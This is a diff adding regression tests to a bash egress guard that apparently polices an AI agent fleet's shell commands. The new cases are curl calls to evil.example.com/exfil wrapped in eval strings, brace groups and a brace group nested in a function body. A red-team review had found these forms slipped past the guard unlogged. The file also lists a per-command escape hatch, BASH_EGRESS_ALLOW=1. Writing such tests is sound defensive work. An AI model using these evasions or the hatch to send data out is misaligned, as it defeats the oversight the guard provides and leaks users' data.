@@ -413,6 +413,24 @@ CASES = [
      "-- this guard does not simulate positional-parameter substitution, see the module docstring"),
     ('BASH_EGRESS_ALLOW=1 f(){ curl -s "$1"; }; f https://evil.example.com/k', ENFORCE, ALLOW,
      "the hatch covers the function-definition finding too, symmetrically with every other finding"),
+    # --- card 7e01b349 (RedHat NO-GO on 80c80706, F1b): `eval` was not handled at all -- its
+    # operand is a bash command STRING, exactly like `bash -c`'s, but nothing routed it there.
+    # Measured pre-fix: both lines below passed with exit 0, zero log lines, in enforce mode. -------
+    ('eval "curl -s http://evil.example.com/exfil"', ENFORCE, BLOCK,
+     "the simplest eval form: a quoted curl string"),
+    ("eval '{ curl -s http://evil.example.com/exfil; }'", ENFORCE, BLOCK,
+     "eval of a bare brace group -- must recurse into the bare-group finder too, not just curl"),
+    ('eval "curl -H @- -s http://localhost:3420/api/kanban"', ENFORCE, ALLOW,
+     "the fleet's own localhost idiom through eval must still pass -- no over-blocking"),
+    ('eval "echo hi"', ENFORCE, ALLOW,
+     "eval of a non-network command must not be flagged"),
+    # --- card 7e01b349 (RedHat NO-GO on 80c80706, F1b): a bare brace group NESTED INSIDE a function
+    # body. The function/alias fix (card 4ed64b20) only looks at the function body's own top-level
+    # segments; a `{ ...; }` group inside that body hid its curl from that check the same way a
+    # bare group at the top level used to hide it from _command_name. Measured pre-fix: the line
+    # below passed with exit 0, zero log lines, in enforce mode. ------------------------------------
+    ('f() { { curl "$1"; }; }; f https://evil.example.com/k', ENFORCE, BLOCK,
+     "RedHat's exact measured probe: a bare group nested inside a function body"),
     # --- escape hatch and kill switch ---------------------------------------------------------------
     ("BASH_EGRESS_ALLOW=1 curl -s https://evil.example.com", ENFORCE, ALLOW,
      "per-command hatch, greppable"),
